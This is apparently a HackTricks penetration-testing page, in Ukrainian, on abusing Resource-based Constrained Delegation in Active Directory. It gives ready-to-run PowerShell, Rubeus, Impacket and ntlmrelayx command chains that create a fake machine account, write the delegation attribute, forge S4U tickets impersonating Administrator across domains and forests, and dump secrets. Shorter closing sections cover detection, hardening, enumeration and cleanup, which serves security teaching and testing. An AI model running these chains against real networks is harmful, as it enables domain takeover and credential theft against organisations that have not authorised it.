# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

Це схоже на базову [Constrained Delegation](constrained-delegation.md), але **замість** надання дозволів **об’єкту** на **імперсонацію будь-якого користувача проти машини**, Resource-based Constrain Delegation **визначає** в **об’єкті, хто може імперсонувати будь-якого користувача проти нього**.<sup>[[12]](#references)</sup>

У цьому випадку constrained object матиме атрибут _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ з ім’ям користувача, який може імперсонувати будь-якого іншого користувача проти нього.

Ще одна важлива відмінність цієї Constrained Delegation від інших делегацій полягає в тому, що будь-який користувач із **write permissions над обліковим записом машини** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) може встановити **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (в інших формах Delegation потрібні були привілеї domain admin).<sup>[[1]](#references)</sup>

### New Concepts

У Constrained Delegation зазначалося, що прапорець **`TrustedToAuthForDelegation`** всередині значення _userAccountControl_ користувача необхідний для виконання **S4U2Self.** Але це не зовсім так.\
Насправді навіть без цього значення можна виконати **S4U2Self** проти будь-якого користувача, якщо ви є **service** (маєте SPN), але якщо у вас **є `TrustedToAuthForDelegation`**, повернений TGS буде **Forwardable**, а якщо цього прапорця **немає**, повернений TGS **не буде** **Forwardable**.<sup>[[5]](#references)</sup>

Однак якщо **TGS**, використаний у **S4U2Proxy**, **НЕ є Forwardable**, спроба зловживання **basic Constrain Delegation** **не спрацює**. Але якщо ви намагаєтеся exploit Resource-Based constrain delegation, це спрацює.<sup>[[1]](#references)[[2]](#references)</sup>

### Attack structure

> Якщо у вас є **write equivalent privileges** над обліковим записом **Computer**, ви можете отримати **privileged access** на цій машині.

Припустімо, що attacker уже має **write equivalent privileges над victim computer**.

1. Attacker **компрометує** обліковий запис, який має **SPN**, або **створює його** (“Service A”). Зверніть увагу, що будь-який _Admin User_ без інших спеціальних привілеїв може **створити** до 10 Computer objects (**_MachineAccountQuota_**) і встановити їм **SPN**. Тому attacker може просто створити Computer object і встановити SPN.
2. Attacker **зловживає своїм WRITE privilege** над victim computer (ServiceB), щоб налаштувати **resource-based constrained delegation** і дозволити ServiceA імперсонувати будь-якого користувача проти цього victim computer (ServiceB).
3. Attacker використовує Rubeus для виконання **повної S4U attack** (S4U2Self і S4U2Proxy) від Service A до Service B для користувача з **privileged access до Service B**.
1. S4U2Self (з скомпрометованого/створеного облікового запису з SPN): запитати **TGS від Administrator до мене** (Not Forwardable).
2. S4U2Proxy: використати **not Forwardable TGS** з попереднього кроку, щоб запитати **TGS** від **Administrator** до **victim host**.
3. Навіть якщо ви використовуєте not Forwardable TGS, оскільки ви exploit Resource-based constrained delegation, це спрацює.
4. Attacker може виконати **pass-the-ticket** і **імперсонувати** користувача, щоб отримати **access до victim ServiceB**.<sup>[[1]](#references)</sup>

Щоб перевірити _**MachineAccountQuota**_ домену, можна використати:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Атака

### Створення об'єкта комп'ютера

Ви можете створити об'єкт комп'ютера в домені за допомогою **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Налаштування Resource-based Constrained Delegation

**Використання модуля activedirectory PowerShell**<sup>[[4]](#references)</sup>.
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Використання powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Виконання повної S4U attack (Windows/Rubeus)

Перш за все, ми створили новий об’єкт Computer із паролем `123456`, тому нам потрібен хеш цього пароля:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Це виведе хеші RC4 та AES для цього облікового запису.\
Тепер можна виконати атаку:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Ви можете згенерувати більше квитків для додаткових служб, виконавши лише один запит за допомогою параметра `/altservice` у Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Зверніть увагу, що користувачі мають атрибут "**Cannot be delegated**". Якщо для користувача цей атрибут має значення True, ви не зможете його імперсонувати. Цю властивість можна переглянути в BloodHound.

### Linux tooling: end-to-end RBCD with Impacket (2024+)

Якщо ви працюєте з Linux, ви можете виконати весь ланцюжок RBCD за допомогою офіційних інструментів Impacket:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Нотатки
- Якщо підписування LDAP/LDAPS увімкнено, використовуйте `impacket-rbcd -use-ldaps ...`.
- Надавайте перевагу AES-ключам; багато сучасних доменів обмежують RC4. Impacket і Rubeus підтримують обидва варіанти роботи лише з AES.
- Impacket може переписувати `sname` ("AnySPN") для деяких інструментів, але за можливості отримуйте правильний SPN (наприклад, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD між доменами та лісами

Якщо **delegating principal**, який ви контролюєте, знаходиться в **іншому домені** (або навіть в **іншому лісі**), ніж **resource computer**, зловживання все одно є **RBCD**, але потік отримання квитка більше не є звичайним однодоменним `S4U2Self -> S4U2Proxy`.

### RBCD між доменами: налаштування foreign principal за SID

Коли ви встановлюєте `msDS-AllowedToActOnBehalfOfOtherIdentity` з **іншого домену**, foreign machine/user може **не визначатися за ім'ям** у LDAP цільового домену. У такому разі налаштуйте запис delegation, використовуючи **SID** foreign principal замість його sAMAccountName/UPN.

Це особливо актуально під час relay NTLM до LDAP за допомогою `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Примітки:
- `--sid` вказує `ntlmrelayx.py` розглядати `--escalate-user` як SID, що необхідно, коли обліковий запис делегування є зовнішнім для цільового домену.
- Навіть якщо інструмент виводить `User not found in LDAP`, запис делегування все одно може бути успішним, оскільки дескриптор безпеки зберігає зовнішній SID безпосередньо.

### Cross-domain RBCD: послідовність cross-realm S4U

Після додавання зовнішнього принципала до `msDS-AllowedToActOnBehalfOfOtherIdentity` робочий cross-domain процес має такий вигляд:<sup>[[9]](#references)[[13]](#references)</sup>

1. Отримати **TGT** для принципала делегування з його власного домену.
2. Запросити **referral TGT** для `krbtgt/<target-domain>`.
3. Запросити **cross-realm S4U2Self referral** для користувача, якого потрібно уособити, на DC цільового домену.
4. Запросити фактичний квиток **S4U2Self** для цього користувача назад у домені делегатора.
5. Виконати **S4U2Proxy** у домені делегатора, щоб отримати referral ticket для цільового домену.
6. Виконати фінальний **S4U2Proxy** на DC цільового домену, щоб отримати service ticket для `cifs/host.target`, `host/host.target` тощо.

Саме тому стандартні Linux-інструменти часто не працюють із cross-domain RBCD:<sup>[[9]](#references)</sup>
- **realm** запиту може відрізнятися від realm TGT, який використовується в `TGS-REQ`
- ланцюжок потребує **незалежних кроків S4U2Proxy**, а не лише `S4U2Self` або `S4U2Self`, одразу після якого виконується один `S4U2Proxy`

### Cross-domain RBCD з Linux

Synacktiv опублікувала реалізацію `getST.py` для Impacket, яка відтворює cross-realm послідовність із Linux шляхом явної роботи з двома KDC:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Операційно, нові аргументи такі:
- `-dc-ip`: DC **делегуючого** домену
- `-targetdomain`: домен **комп'ютера ресурсу**
- `-targetdc`: DC домену **ресурсу**

### Обмеження RBCD між лісами

RBCD між лісами має важливе обмеження: **користувач, якого імперсонують, має належати до того самого лісу, що й делегуючий принципал**. Іншими словами, якщо контрольований вами обліковий запис комп'ютера знаходиться у `valhalla.local`, а цільовий ресурс — у `asgard.local`, ви зазвичай **не можете імперсонувати довільних користувачів `asgard.local`** для доступу до цього ресурсу через RBCD.<sup>[[9]](#references)</sup>

Це все ще можна експлуатувати, якщо:
- користувач **делегуючого лісу** є **локальним адміністратором** (або має інші привілеї) на хості ресурсу в іншому лісі
- trust дозволяє потрібний шлях автентифікації, а foreign SID приймається дескриптором безпеки цільового комп'ютера

### Особливості протоколу RBCD між лісами

RBCD між лісами — це не просто "міждоменний RBCD плюс trust". Спостережуваний процес має дві особливості, які історично часто пропускаються поширеними інструментами:<sup>[[9]](#references)</sup>

1. Додатковий запит **S4U2Proxy**, який встановлює **`PA-PAC-OPTIONS=branch-aware`**
2. Фінальний service ticket, який може бути повернутий із використанням **RC4**, навіть якщо було запитано інші etype

Практичний процес:

1. Отримати TGT для делегуючого принципала в лісі A.
2. Запросити **S4U2Self** для користувача, якого імперсонують, у лісі A.
3. Запросити **S4U2Proxy** у лісі A, щоб отримати referral TGT для лісу B.
4. Надіслати другий **S4U2Proxy** у лісі A **без S4U2Self ticket як додаткового ticket**, але з увімкненим `branch-aware`, щоб отримати ще один referral TGT для лісу B.
5. За потреби запросити звичайний service ticket у лісі B для делегуючого принципала (цей ticket не потрібен для фінальної експлуатації).
6. Використати referral tickets із кроків 3 і 4, щоб запросити фінальний **S4U2Proxy** ticket у лісі B для користувача лісу A, якого імперсонують, до цільового SPN.

### RBCD між лісами з Linux

Та сама гілка Synacktiv Impacket додає перемикач `-forest` для цієї логіки:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Рекурсивний multi-domain RBCD (3+ домени)

У **multi-domain forests** як **S4U2Self**, так і **S4U2Proxy** можуть бути **рекурсивними**, а не зупинятися після одного referral:

- **Рекурсивний S4U2Self**: перший `S4U2Self` надсилається до **домену impersonated user**, проміжні переходи між parent/child виконуються за допомогою звичайних `TGS-REQ` referrals для `krbtgt/<REALM>`, а **фінальний `S4U2Self`** надсилається у **власному домені delegating principal**.
- Це означає, що **самого володіння TGT** для machine account може бути достатньо, щоб impersonate **адміністратора з іншого домену в тому самому forest** і запросити `cifs/host`, `host/host`, `wsman/host` тощо.
- **Рекурсивний S4U2Proxy** проходить trust chain так само: проміжні переходи повторно використовують попередній ticket як TGT під час запиту наступного referral `krbtgt/<REALM>`, і лише останній перехід повертає фінальний service ticket.<sup>[[10]](#references)</sup>

Практичний приклад у тому самому forest:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

Якщо **delegating principal є користувачем без SPN**, останній рекурсивний `S4U2Self` завершується помилкою **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Обхід полягає в тому, щоб **повторити лише фінальний hop як `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Стислий опис ланцюжка зловживання:

1. Автентифікуватися за допомогою **NT hash**, щоб підштовхнути KDC до використання **RC4-HMAC (etype 23)**.
2. Спочатку виконати запит **`-self -u2u`** і зберегти цей ticket окремо від подальшого proxy-кроку.
3. Отримати **TGT session key** за допомогою `describeTicket.py`.
4. Замінити **NT hash** користувача на цей **session key** за допомогою `changepasswd.py -newhashes <session_key>`.
5. Повторно використати ticket `S4U2Self+U2U` як **`-additional-ticket`** під час окремого запиту **`-proxy`**.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Операційні застереження:

- Якщо **перший trusted hop уже є іншим forest**, надавайте перевагу **branch-aware** алгоритму (`getST.py ... -forest`), щоб відповідати нативній поведінці Windows. Якщо foreign forest досягається лише **пізніше** в ланцюжку, non-branch-aware recursive flow усе ще може працювати.<sup>[[9]](#references)</sup>
- На сучасних **Windows Server 2022/2025** DC примусове використання RC4 може завершитися помилкою **`KDC_ERR_ETYPE_NOSUPP`** через deprecated RC4; це може зробити **SPN-less RBCD неможливим**, навіть якщо класичний SPN-backed RBCD усе ще працює з AES.<sup>[[15]](#references)</sup>
- Виконайте **`S4U2Self+U2U` до зміни hash/password користувача**: `SamrChangePasswordUser` **не перераховує** Kerberos AES keys облікового запису, тому зміна password спочатку може зламати наступні запити ticket.<sup>[[14]](#references)</sup>
- Обліковий запис, який impersonate, усе ще має бути **delegable**: **Protected Users** і облікові записи з **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** блокують ланцюжок.

## Нотатки щодо виявлення / hardening

- RBCD paths між domains/forests зазвичай усе ще створюються через **ACL abuse** або **relay-to-LDAP**. Увімкніть **LDAP signing** і **LDAP channel binding** на DC, щоб заблокувати поширені шляхи налаштування.
- Проведіть аудит того, хто може записувати `msDS-AllowedToActOnBehalfOfOtherIdentity` в об’єкти computer, і визначте збережені SIDs, зокрема **foreign security principals**.
- У середовищах із великою кількістю trust перевірте **Selective Authentication**, **SID filtering** і те, чи мають users із foreign forest права **local admin** на resource hosts.

### Доступ

Останній command line виконає **complete S4U attack і inject TGS** від Administrator до victim host у **memory**.\
У цьому прикладі було запитано TGS для service **CIFS** від Administrator, тому ви зможете отримати доступ до **C$**:
```bash
ls \\victim.domain.local\C$
```
### Зловживання різними службовими квитками

Дізнайтеся про [**доступні службові квитки тут**](silver-ticket.md#available-services).

## Перерахування, аудит і очищення

### Перерахування комп’ютерів із налаштованим RBCD

PowerShell (декодування SD для визначення SID):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (прочитати або очистити однією командою):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Очищення / скидання RBCD

- PowerShell (очистити атрибут):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Помилки Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Це означає, що Kerberos налаштовано не використовувати DES або RC4, а ви передаєте лише RC4 hash. Передайте в Rubeus щонайменше AES256 hash (або просто передайте йому hashes rc4, aes128 та aes256). Приклад: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** під час `-self` для звичайного користувача: делегуючий principal, імовірно, **не має SPN**. Повторіть **останній hop** як **`S4U2Self+U2U`** замість звичайного **`S4U2Self`**.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** під час **SPN-less RBCD**: нові DC можуть відхилити примусовий шлях **RC4-HMAC**, необхідний для трюку **`S4U2Self+U2U` + session-key-substitution**. Спробуйте класичний шлях **SPN-backed** RBCD з AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Це означає, що час на поточному комп’ютері відрізняється від часу на DC, тому Kerberos працює некоректно.
- **`preauth_failed`**: Це означає, що вказані username + hashes не працюють для входу. Можливо, ви забули додати `$` до username під час генерації hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Це може означати:
- Користувач, якого ви намагаєтеся impersonate, не може отримати доступ до потрібного service (тому що ви не можете його impersonate або він не має достатніх privileges)
- Запитуваний service не існує (якщо ви запитуєте ticket для winrm, але winrm не запущено)
- Створений fakecomputer втратив свої privileges над vulnerable server, і вам потрібно повернути їх.
- Ви зловживаєте classic KCD; пам’ятайте, що RBCD працює з non-forwardable S4U2Self tickets, тоді як KCD потребує forwardable.

## Примітки, relay та альтернативи

- Ви також можете записати RBCD SD через AD Web Services (ADWS), якщо LDAP фільтрується. Дивіться:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains часто завершуються RBCD, щоб за один крок отримати локальний SYSTEM. Практичні end-to-end приклади:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Якщо LDAP signing/channel binding **вимкнено** і ви можете створити machine account, такі tools, як **KrbRelayUp**, можуть relay-ити coerced Kerberos auth до LDAP, встановити `msDS-AllowedToActOnBehalfOfOtherIdentity` для вашого machine account на target computer object і негайно impersonate-ити **Administrator** через S4U з off-host.<sup>[[8]](#references)</sup>

## References

- [1] [Розмахування собакою: зловживання Resource-Based Constrained Delegation для атаки на Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Ще одне слово про Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: захоплення Computer Object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Зловживання Resource-Based Constrained Delegation](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity знищила Domain: огляд Offensive Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Коротка Linux cheatsheet із сучасним syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing вимкнено → Kerberos relay до RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - дослідження cross-domain і cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - дослідження cross-domain і cross-forest RBCD: частина 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Гілка Synacktiv Impacket - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - огляд Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - виявлення та усунення використання RC4 у Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
